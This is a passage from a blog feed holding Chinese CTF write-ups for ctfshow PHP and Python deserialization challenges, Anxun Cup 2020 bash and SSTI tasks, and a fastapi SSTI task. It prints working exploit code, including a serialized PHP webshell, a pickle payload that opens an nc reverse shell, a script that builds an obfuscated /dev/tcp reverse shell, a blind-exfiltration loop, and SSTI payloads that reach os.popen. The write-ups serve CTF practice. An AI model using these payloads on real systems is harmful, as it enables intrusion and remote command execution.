class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="string">'system("cat f*");'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a  = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="comment">//private改成了public</span></span><br><span class="line"><span class="comment">//正则匹配用+号绕过o:之后的数字匹配即可</span></span><br></pre></td></tr></table></figure><h3 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$vip = unserialize($_GET[<span class="string">'vip'</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line">$vip-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$xff = explode(<span class="string">','</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">array_pop($xff);</span><br><span class="line">$ip = array_pop($xff);</span><br><span class="line"><span class="keyword">if</span>($ip!==<span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$token = $_POST[<span class="string">'token'</span>];</span><br><span class="line"><span class="keyword">if</span>($token==<span class="string">'ctfshow'</span>)&#123;</span><br><span class="line">file_put_contents(<span class="string">'flag.txt'</span>,$flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察序列化但是没有给类和方法，说明考察内置类，这里考察SoapClient反序列化+clrf打ssrf，下面是两篇参考文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_38154820&#x2F;article&#x2F;details&#x2F;106330082</span><br><span class="line">https:&#x2F;&#x2F;wooyun.js.org&#x2F;drops&#x2F;CRLF%20Injection漏洞的利用与实例分析.html</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/flag.php'</span>;</span><br><span class="line"><span class="comment">//$post_string = 'data=something';</span></span><br><span class="line">$post_string = <span class="string">'token=ctfshow'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1,127.0.0.1'</span>,</span><br><span class="line">    <span class="comment">//'Cookie: PHPSESSID=my_session'</span></span><br><span class="line">    <span class="string">'UM_distinctid:176faec63301f9-04a3a854efc541-4c3f207e-144000-176faec6331407'</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>=&gt;<span class="string">"aaab"</span>));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> urlencode($aaa);</span><br></pre></td></tr></table></figure><p>传参给vip之后访问/flag.txt即可</p><h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p>正则匹配，直接将匹配内容传给参数即可</p><h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p>序列化逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//message.php</span></span><br><span class="line"><span class="keyword">if</span>($msg-&gt;token==<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$umsg = str_replace(<span class="string">'fuck'</span>, <span class="string">'loveU'</span>, serialize($msg));</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">";s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>传参即可，访问message.php</p><h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p><a href="http://www.zip拿到了源码" target="_blank" rel="noopener">www.zip拿到了源码</a></p><p>session序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_serialize引擎 a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">6</span>:<span class="string">"spoock"</span>;&#125;</span><br><span class="line">php引擎 name|s:<span class="number">6</span>:<span class="string">"spoock"</span>;</span><br><span class="line">php_binary引擎 names:<span class="number">6</span>:<span class="string">"spoock"</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#inc.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $status;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span><span class="params">($s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">"log-"</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">"使用"</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">"登陆"</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">"成功"</span>:<span class="string">"失败"</span>).<span class="string">"----"</span>.date_create()-&gt;format(<span class="string">'Y-m-d H:i:s'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写文件，可以写入一句话shell</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line">setcookie(<span class="string">"limit"</span>,base64_encode(<span class="string">'1'</span>));</span><br><span class="line">写入cookie</span><br><span class="line"><span class="comment">#check.php</span></span><br><span class="line">$_COOKIE[<span class="string">'limit'</span>] = base64_encode(base64_decode($_COOKIE[<span class="string">'limit'</span>])+<span class="number">1</span>);</span><br><span class="line">调用了cookie</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $status;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;username = <span class="string">'a.php'</span>;</span><br><span class="line">$a-&gt;password = <span class="string">'&lt;?php eval($_POST["cmd"]);?&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">'|'</span>.serialize($a));</span><br><span class="line"><span class="comment">#fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJhLnBocCI7czo4OiJwYXNzd29yZCI7czoyODoiPD9waHAgZXZhbCgkX1BPU1RbImNtZCJdKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span></span><br></pre></td></tr></table></figure><p>修改cookie，访问<code>index.php</code>再访问<code>check.php</code>，这里会生成<code>log-a.php</code>文件，访问就可以利用</p><h3 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h3><p>和262一样，只不过多了个cookie验证，然后<code>$_cookie[]</code>换成了<code>$_SESSION[]</code></p><h3 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h3><p>按地址传参，一个值改变另一个值都会相应发生变化</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="string">'a'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = &amp;<span class="keyword">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><h3 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h3><p>类名大小写不敏感</p><h3 id="web267-270"><a href="#web267-270" class="headerlink" title="web267-270"></a>web267-270</h3><p>看Yii框架反序列化漏洞分析文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ambitiousleader.github.io&#x2F;2021&#x2F;01&#x2F;15&#x2F;Yii框架反序列化漏洞&#x2F;</span><br></pre></td></tr></table></figure><h3 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h3><p>tp5.1反序列化漏洞</p><h3 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h3><p>要保证<code>$this-&gt;evilfile</code>为true，就可以进行命令执行，前面拼接的<code>rm</code>命令用linux分隔符进行阻断即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:flag&#x3D;123</span><br><span class="line">GET:fn&#x3D;;cat f*</span><br></pre></td></tr></table></figure><h3 id="web277-web278"><a href="#web277-web278" class="headerlink" title="web277-web278"></a>web277-web278</h3><p>源码有提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&#x2F;backdoor?data&#x3D; m&#x3D;base64.b64decode(data) m&#x3D;pickle.loads(m) --&gt;</span><br></pre></td></tr></table></figure><p>python序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span>(eval,(<span class="string">'__import__("os").popen("nc IP port  -e /bin/sh").read()'</span>,))</span><br><span class="line">a=A()</span><br><span class="line">test=pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(test))</span><br></pre></td></tr></table></figure><p>反弹shell</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;序列化部分练手，避免手生
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>安洵杯2020复现</title>
    <link href="http://yoursite.com/2020/12/18/%E5%AE%89%E6%B4%B5%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/12/18/%E5%AE%89%E6%B4%B5%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-18T07:44:31.000Z</published>
    <updated>2021-01-13T09:08:22.597Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<a id="more"></a></h3><p>比赛当天在赶路，只看到了这一题，没好好看，源码放送来复现了</p><h2 id="Bash-Vino0o0o"><a href="#Bash-Vino0o0o" class="headerlink" title="Bash-Vino0o0o"></a>Bash-Vino0o0o</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>bash</li><li>移位运算</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"cmd"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $test = $_POST[<span class="string">'cmd'</span>];</span><br><span class="line">    $white_list = str_split(<span class="string">'$&#123;#&#125;\\(&lt;)\'0'</span>); </span><br><span class="line">    $char_list = str_split($test);</span><br><span class="line">    <span class="keyword">foreach</span>($char_list <span class="keyword">as</span> $c)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!in_array($c,$white_list))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"Cyzcc"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    exec($test);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>无回显的命令执行，给了白名单，限制了能用的字符</p><p>无回显，盲注或者反弹shell，重点部分是拼凑出字符</p><p>这里可以利用八进制转换成字符进行bash命令执行，所以只需要拼凑出0-7的数字，再进行转换</p><p>转换成数字之后就需要用到<code>&lt;&lt;&lt;</code>来重定向了，但是一层不够，只用一层会出现<code>bash: $&#39;\154\163&#39;: command not found</code>这样的报错，需要第二次解析。因此需要给原先的命令添加转义字符</p><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">n = dict()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">'0'</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">'$&#123;##&#125;'</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">'$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))'</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">'$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))'</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">'$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))'</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">'$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;))'</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">'$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;0))'</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">'$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))'</span></span><br><span class="line">f=<span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_oct</span><span class="params">(cmd)</span>:</span>                                <span class="comment">#命令转换成八进制字符串</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">'%s'</span> % (oct(ord(t))))[<span class="number">2</span>:]</span><br><span class="line">        s+=<span class="string">'\\'</span>+o</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(cmd)</span>:</span>                                     <span class="comment">#八进制字符串转换成字符</span></span><br><span class="line">    payload = <span class="string">"$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\'"</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">'\\'</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload+=<span class="string">"\\\\"</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload+=n[int(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">'\\\''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(url,payload)</span>:</span>                          <span class="comment">#盲注函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">'cmd'</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data,timeout=<span class="number">1.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">print(build(<span class="string">'bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1'</span>))</span><br><span class="line"><span class="comment"># a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#123;&#125;@'</span></span><br><span class="line"><span class="comment"># for i in range(1,50):</span></span><br><span class="line"><span class="comment">#     for j in a:</span></span><br><span class="line"><span class="comment">#         cmd=f'cat /flag|grep ^&#123;f+j&#125;&amp;&amp;sleep 3'</span></span><br><span class="line"><span class="comment">#         url = "ip/"</span></span><br><span class="line"><span class="comment">#         if get_flag(url,build(cmd)):</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment">#     f = f+j</span></span><br><span class="line"><span class="comment">#     print(f)</span></span><br></pre></td></tr></table></figure><p>反弹shell和盲注都能打通</p><p>#反弹</p><img src="/2020/12/18/%E5%AE%89%E6%B4%B5%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/1.png" class=""><p>#盲注</p><img src="/2020/12/18/%E5%AE%89%E6%B4%B5%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/2.png" class=""><h2 id="Normal-SSTI"><a href="#Normal-SSTI" class="headerlink" title="Normal SSTI"></a>Normal SSTI</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>SSTI模板注入绕过</li><li>unicode绕过</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>这道题本地复现遇到问题，环境搭好了访问一直是500，暂时不知是不是因为刚用了翻墙软件的原因，这道题本身不难，主要是下面几个点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 没有&#96;&#123;&#123;&#125;&#125;&#96;构造回显&#96;(&#123;%print()%&#125;)&#96;</span><br><span class="line">2. 绕过字符串过滤</span><br></pre></td></tr></table></figure><p>直接放payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test?url=&#123;%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%&#125;</span><br></pre></td></tr></table></figure><p>这道题暂且这样，有机会再弄弄</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言
    
    </summary>
    
    
    
      <category term="安洵杯" scheme="http://yoursite.com/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>1024cup</title>
    <link href="http://yoursite.com/2020/12/02/1024cup/"/>
    <id>http://yoursite.com/2020/12/02/1024cup/</id>
    <published>2020-12-02T08:58:45.000Z</published>
    <updated>2020-12-06T12:05:24.591Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1024-WEB签到"><a href="#1024-WEB签到" class="headerlink" title="1024_WEB签到"></a>1024_WEB签到<a id="more"></a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>]);</span><br></pre></td></tr></table></figure><p>这道题<code>call_user_func</code>只有一个参数，试了试只能调用phpinfo</p><p>开始以为phpinfo里没什么用，后来发现就藏在这里面</p><img src="/2020/12/02/1024cup/1.png" class=""><p>这里有一个能调用的方法，直接调用就有flag了</p><img src="/2020/12/02/1024cup/2.png" class=""><h2 id="1024-fastapi"><a href="#1024-fastapi" class="headerlink" title="1024_fastapi"></a>1024_fastapi</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>SSTI模板注入</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>fastapi，搜索官方文档说明，发现有默认的两个访问路径，选择其中一个就可以，<code>/docs</code>或者<code>/redoc</code></p><p>访问其中一个</p><img src="/2020/12/02/1024cup/3.png" class=""><p>存在<code>/cccalccc</code>，post传参给<code>q</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=str([].__class__.__base__.__subclasses__())</span><br></pre></td></tr></table></figure><p>这里要以list或者是str的类型传参给q，不然会报<code>Internal Server Error</code>的错，找<code>warning.catch_warnings</code>的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://48c0106d-3023-4d93-834d-fe65ca1f76e8.chall.ctf.show/cccalccc"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'q'</span> : <span class="string">'str([].__class__.__base__.__subclasses__()['</span>+str(i)+<span class="string">'])'</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'warnings.catch_warning'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(i)</span><br><span class="line"><span class="comment">#i=189</span></span><br></pre></td></tr></table></figure><p>下面就是常规知识点，过滤了<code>import</code>用字符串进行拼接，<code>popen</code>替换<code>system</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str([].__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__imp'</span>+<span class="string">'ort__'</span>](<span class="string">'os'</span>).__dict__[<span class="string">'pop'</span>+<span class="string">'en'</span>](<span class="string">'find /app|xargs grep flag'</span>).read())</span><br><span class="line"><span class="comment">#查找flag文件</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"res"</span>: <span class="string">"/app/main.py:        hint = \"flag is in /mnt/f1a9,try to read it\"\n/app/start.sh:source flag.sh\n"</span>,</span><br><span class="line">    <span class="string">"err"</span>: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取flag即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 